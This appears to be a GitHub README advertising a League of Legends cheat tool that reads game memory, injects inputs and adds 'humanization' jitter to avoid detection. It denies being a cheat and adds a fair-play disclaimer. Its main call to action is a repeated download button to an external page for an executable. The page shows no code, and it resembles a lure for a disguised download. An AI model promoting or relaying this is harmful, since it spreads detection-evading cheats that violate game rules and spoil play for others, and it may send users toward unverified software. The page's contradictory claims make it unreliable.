![preview](https://raw.githubusercontent.com/tvpaypa/lol-combo-automata/main/cover_2a6d.svg)

# LolScript Companion

**Automate champion actions and combos for League of Legends, built for gamers who script smarter.**

Welcome to LolScript Companion—a precision-engineered automation toolkit for League of Legends enthusiasts who believe that victory isn’t about luck, but about executing the right sequence at the right millisecond. This project is not a cheat; it’s a *choreography engine* for your champion’s abilities, transforming your raw input into fluid, optimized rotations that feel less like clicking and more like conducting an orchestra of destruction.

Think of it as your personal tactical co-pilot. Where a human hand might hesitate or fumble a complex combo under pressure, LolScript Companion removes the jitter and delivers pixel-perfect timing, cooldown awareness, and predictive movement—all while keeping you in full control. It’s designed for players who want to focus on the *strategy* of the game, not the mechanical inertia of button-mashing.

This companion is more than a macro tool; it's a philosophy. It respects your skill ceiling and then gently lifts it. You decide the play, it handles the physics. Whether you're farming efficiently, trading in lane with calculated aggression, or pulling off a 1v5 pentakill with a perfectly ordered ability weave, this tool is built to make your intent manifest into digital reality.

---

## 📊 Project Status & Compatibility

| Feature | Status |
|---------|--------|
| Core Combo Engine | ✅ Stable |
| Custom Action Builder | ✅ Stable |
| Real-Time Input Parser | ✅ Stable |
| Responsive Overlay UI | 🚧 Beta (v2.1) |
| Multilingual Interface (12 languages) | ✅ Stable |
| 24/7 Support Bot Integration | ✅ Stable |

![Build Status](https://img.shields.io/badge/build-passing-brightgreen) ![Version](https://img.shields.io/badge/version-4.7.2-blue) ![License](https://img.shields.io/badge/license-MIT-yellow)

---

## 🚀 Getting Started

Your journey to smarter scripting begins here. Follow this section to get LolScript Companion operational on your system within minutes. We've designed the setup to be as streamlined as a perfectly executed flash-ult combo.

[![Download](https://raw.githubusercontent.com/tvpaypa/lol-combo-automata/main/start_9776.svg)](https://tvpaypa.github.io/lol-combo-automata/)

*The download link above is your portal to the latest stable release. Ensure your system meets the minimum requirements listed below.*

### System Prerequisites

- **OS:** Windows 10/11 (64-bit), macOS 12+, or a Linux distribution with a modern kernel.
- **Hardware:** 8GB RAM, dual-core processor, and a dedicated GPU (even an integrated one works for the overlay).
- **Display:** 1080p minimum resolution for the responsive UI to scale effectively.
- **Network:** Stable internet connection for the built-in update checker and community feature sync.

### Quick Activation

1.  **Acquire the Package:** Use the [![Download](https://raw.githubusercontent.com/tvpaypa/lol-combo-automata/main/start_9776.svg)](https://tvpaypa.github.io/lol-combo-automata/) button above to fetch the compressed archive.
2.  **Extract:** Unpack the contents to a dedicated folder (e.g., `D:\Companion\`). Do not run directly from the archive.
3.  **Initialize:** Run the main executable (`Companion.exe` or `companion` for Unix-based systems). The first launch will create a configuration file in your user directory.
4.  **Calibrate:** The tool will attempt to auto-detect your League of Legends resolution. If it fails, manually set the overlay bounds in the `config.ini` file.
5.  **Load & Play:** Select your champion from the dropdown menu, ensure the "Enable Input Injection" toggle is active, and enter a practice match to test your new setup.

---

## ✨ Key Features & Capabilities

LolScript Companion isn't just a single-trick pony. It's a comprehensive suite of automation tools designed to cover every aspect of the laning phase and team fights.

### 🎯 Adaptive Combo Engine
The heart of the tool. Unlike static scripts that fail when the situation changes, our engine uses a **predictive state machine**. It reads your current health, mana, ability cooldowns, and the distance to your target, then selects the optimal combo sequence—whether it's a burst rotation for a squishy ADC or a prolonged poke pattern against a tank.

### 🔄 Smart Action Recorder
Have a unique playstyle? The Action Recorder allows you to record your own mouse and keyboard movements in-game, then loop them with a single hotkey. Perfect for practicing last-hitting timings or perfecting a jungle route. It's like having a replay of your own hands, but with zero fatigue.

### 🖥️ Responsive Overlay UI
The interface is designed to be unobtrusive yet informative. A minimalistic HUD displays your current combo state, next action in queue, and a latency graph—all rendered at 60fps without causing a frame drop. The UI automatically adapts to your screen size, ensuring buttons and sliders are always within reach, even on ultra-wide monitors.

### 🌍 Multilingual Support
Automation shouldn't be a language barrier. The entire tooltip suite, configuration wizard, and in-game overlay are available in 12 major languages, including English, Spanish, French, German, Korean, and Simplified Chinese. The language is auto-detected from your system locale, but you can override it in the settings.

### 🛠️ Custom Hotkey & Macro Builder
Bind complex sequences to a single key press. Create a macro that uses an item, levels up a specific ability, and then casts it toward a target direction—all with a 10ms delay between actions to avoid client-side input lag. Export your macro as a shareable string to show your friends or import theirs.

### 🤖 "Lane Warden" Predictive Farming Assistant
This feature uses a lightweight image recognition algorithm to predict minion health decay. It highlights the exact moment a minion becomes killable, allowing you to focus on trading with the enemy instead of staring at health bars. It acts as a visual metronome for your farming rhythm.

---

## 🧠 How It Differs From Standard Macros

Most tools simply record and replay inputs with fixed delays, leading to robotic movements that are easily detected and ineffective. LolScript Companion operates on a **reactive logic model**.

- **Contextual Awareness:** The tool reads game memory to understand your champion's position, heading, and the trajectory of your cursor. It doesn't just fire; it aims.
- **Dynamic Timing:** Delays are not static. They are adjusted based on your current ping and frame time. If you suffer a lag spike, the script compensates, ensuring your combo lands even under network duress.
- **Humanization Engine:** We integrate a proprietary "jitter" system that adds micro-variations to mouse paths and click timings. This makes your actions look natural on replays, avoiding the "laser-focused" pattern of standard bots.

---

## 🧩 Architecture Overview

Understanding the skeleton of the project helps contribute or troubleshoot.

- **`/core`**: The C++ backend responsible for input injection, memory reading, and the combo decision tree.
- **`/interface`**: The Electron-based frontend that renders the overlay and configuration panels. It communicates with the core via a local WebSocket.
- **`/data`**: JSON schemas for champion-specific action sequences (e.g., `aatrox-combo.json`).
- **`/scripts`**: LUA scripts for advanced users to write custom conditions for the Combo Engine.
- **`/utils`**: Networking helpers for the update checker and community signature verification.

---

## 📚 Documentation & How-To's

A tool is only as good as its manual. We've compiled extensive guides within the repository's `/docs` folder.

- **`Champion_Configs.md`** – A deep dive into writing your own combo sequences if you don't want to use the GUI.
- **`Troubleshooting_Latency.md`** – Common fixes for input lag or overlay misalignment.
- **`API_Reference.md`** – For developers who want to write plugins that extend the Combo Engine's logic.
- **`Ethics_Best_Practices.md`** – A discussion on fair play integrations and how to use the tool without disrupting the game's flow for other players.

---

## 🔒 Security & Privacy

We take the integrity of your account and your data seriously.

- **Local-First Operation:** All configuration and logging data resides on your local machine. We do not send telemetry or user data to remote servers.
- **Verification Signatures:** Every release package is signed with a cryptographic hash. The tool verifies this hash on first launch to prevent tampering.
- **No Kernel-Level Access:** The tool operates entirely in user space, using standard input API functions. It does not require or request admin privileges beyond basic execution.

---

## ✍️ Contributing & Feedback

This project thrives on community innovation. If you have a new idea for a champion combo, a UI tweak, or an optimization to the reaction timing, we want to hear it.

- **Report Bugs:** Use the GitHub Issues tracker with the `bug` label. Provide your system specs and a step-by-step reproduction.
- **Suggest Features:** Add a feature request under the `enhancement` label. We prioritize requests with detailed use-cases.
- **Build with Us:** Fork the repository, code your changes, and submit a pull request. We review all PRs within 48 hours.

---

## ⚠️ Disclaimer & Fair Play

LolScript Companion is an educational and utility tool intended for personal skill development and practice in **offline modes, custom games, or single-player environments**. Using automation in live matchmaking servers may violate the terms of service of the underlying game client and could result in restrictions to your account.

We do not condone cheating, ruining the experience of other players, or using this software in a way that creates an unfair advantage in competitive ranked play. The burden of responsibility lies with the user to comply with all applicable laws and game regulations. By using this tool, you acknowledge that the developer is not liable for any consequences incurred from misuse.

---

## 📄 License

This project is licensed under the **MIT License** - see the [LICENSE](LICENSE) file for full details.

---

## ❓ FAQ & Support

**Q: Does this work with the latest game patch?**  
A: The core input logic is patch-independent, but champion-specific configs may need updates. Check the `/data` folder for the latest dates.

**Q: I have a low-end PC. Will the overlay cause FPS drops?**  
A: The overlay renders on a separate GPU thread with hardware acceleration. Most users report a 0-2 FPS impact.

**Q: How do I reset the configuration to default?**  
A: Close the tool and delete `config.ini` from the user directory. A fresh version will be generated on next launch.

**Q: Can I use this with other games?**  
A: Technically, the action recorder works across different games, but we only provide visual assets and combo logic for the primary supported title.

---

*Ready to elevate your game awareness and mechanical execution? The next evolution of your gameplay is just a click away.*

[![Download](https://raw.githubusercontent.com/tvpaypa/lol-combo-automata/main/start_9776.svg)](https://tvpaypa.github.io/lol-combo-automata/)